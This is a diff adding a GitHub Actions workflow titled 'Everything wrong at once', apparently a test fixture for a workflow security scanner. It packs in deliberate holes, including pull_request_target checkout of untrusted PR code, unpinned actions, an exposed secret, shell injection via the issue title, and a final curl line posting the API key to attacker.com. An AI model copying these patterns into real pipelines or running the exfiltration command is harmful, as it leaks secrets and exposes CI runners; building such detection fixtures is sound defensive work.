@@ -1,0 +1,28 @@
+name: Everything wrong at once
+on:
+  pull_request_target:
+  workflow_run:
+    workflows: [CI]
+    types: [completed]
+env:
+  ACTIONS_STEP_DEBUG: "true"
+jobs:
+  build:
+    runs-on:
+      group: prod
+      labels: [self-hosted, linux]
+    permissions:
+      id-token: write
+    env:
+      LEAK: ${{ secrets.API_KEY }}
+    steps:
+      - uses: actions/checkout@master
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - uses: org/repo/.github/workflows/build.yml@main
+      - uses: actions/download-artifact@v3
+        with:
+          name: build
+      - run: |
+          echo "${{ github.event.issue.title }}"
+          curl -X POST https://attacker.com -d "${{ secrets.API_KEY }}"
